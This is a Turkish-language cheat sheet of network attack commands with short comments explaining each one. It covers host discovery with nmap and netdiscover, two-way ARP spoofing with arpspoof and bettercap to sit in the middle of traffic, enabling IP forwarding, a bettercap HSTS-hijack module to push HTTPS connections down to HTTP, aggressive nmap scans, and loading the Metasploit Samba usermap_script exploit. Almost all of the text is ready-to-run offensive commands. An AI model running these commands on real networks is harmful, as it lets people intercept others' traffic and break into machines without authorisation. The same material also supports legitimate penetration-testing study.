nmap 192.168.1.0/24 # Bu IP aralığındaki tüm cihazları tespit etmek için bir ağ taraması yapar.

netdiscover -i eth0 -r 192.168.1.0/24 -c 10 # Belirtilen IP aralığında ARP istekleri ile aktif cihazları keşfeder; eth0 arayüzü üzerinden 10 defa tekrar eder.

arpspoof -i eth0 -t 10.1.1.8 10.1.1.9 # 10.1.1.8 IP adresini hedef alarak, ona 10.1.1.9 IP adresindeymiş gibi davranır (Man-in-the-Middle saldırısı).

arpspoof -i eth0 -t 10.1.1.9 10.1.1.8 # 10.1.1.9 IP adresini hedef alarak, ona 10.1.1.8 IP adresindeymiş gibi davranır (Man-in-the-Middle saldırısı).

echo 1 > /proc/sys/net/ipv4/ip_forward # IP yönlendirmeyi etkinleştirir, paketlerin bir ağdan diğerine geçmesine izin verir (MITM saldırıları için gereklidir).

arp -a # Mevcut ARP tablosunu görüntüler; ARP saldırıları olup olmadığını kontrol etmek için kullanılabilir.

bettercap -iface eth0 # Belirtilen ağ arayüzü üzerinden Bettercap'i başlatır.
    net.probe on # Ağda mevcut cihazları ve servisleri tarar.
    set arp.spoof.fullduplex true # Hem hedef cihazı hem de ağ geçidini (modem/router) kandırır (tam çift yönlü saldırı).
    set arp.spoof.internal true # Yerel ağda ARP sahtekarlığını etkinleştirir.
    set arp.spoof.targets 172.68.27.43 # Saldırının hedefleneceği IP adresini belirtir.
    arp.spoof on # ARP sahtekarlığını başlatır.
    hstshijack/hstshijack # HSTS protokolünü devre dışı bırakarak HTTPS bağlantılarını HTTP'ye düşürmeyi dener.

nmap -v -sS -A -T4 192.168.1.49 # Belirtilen IP adresinde ayrıntılı bir tarama yapar; işletim sistemi tespiti, servis sürümü tespiti, ve komut dosyası taramaları yapar, SYN taraması (yarı açık) kullanır, tarama hızı agresif modda (T4).
    nmap 192.168.1.1 # Belirtilen tek bir IP adresini standart olarak tarar.
    nmap 192.168.1.1-254 # Belirtilen IP aralığındaki tüm cihazları tarar.
    nmap 192.168.1.0/24 # Belirtilen alt ağdaki tüm cihazları tarar.
    nmap scanme.nmap.org # Belirtilen alan adını tarar.
    nmap 192.168.1.1 -sS # Belirtilen IP adresinde SYN taraması (yarı açık tarama) yapar.
    nmap 192.168.1.1 -p 21-100 # Belirtilen IP adresinde 21-100 arasındaki portları tarar.
    nmap 192.168.1.1 -A # Belirtilen IP adresinde OS tespiti, servis sürüm tespiti, komut dosyası taramaları ve traceroute'u etkinleştirir.
    nmap 192.168.1.1 -T4 # Hızlı bir ağda agresif zamanlamayla tarama yapar; tarama hızını artırır.
    # Tarama sonucunda tespit edilen servislerin sürümlerini kontrol ederek bilinen zafiyetler olup olmadığını araştırabiliriz ve bu zafiyetleri exploit edebiliriz.

msfconsole # Metasploit Framework konsolunu açar, güvenlik açıkları için exploitler içerir.
    use exploit/multi/samba/usermap_script # Samba hizmeti için kullanılabilecek bir exploit modülünü seçer.
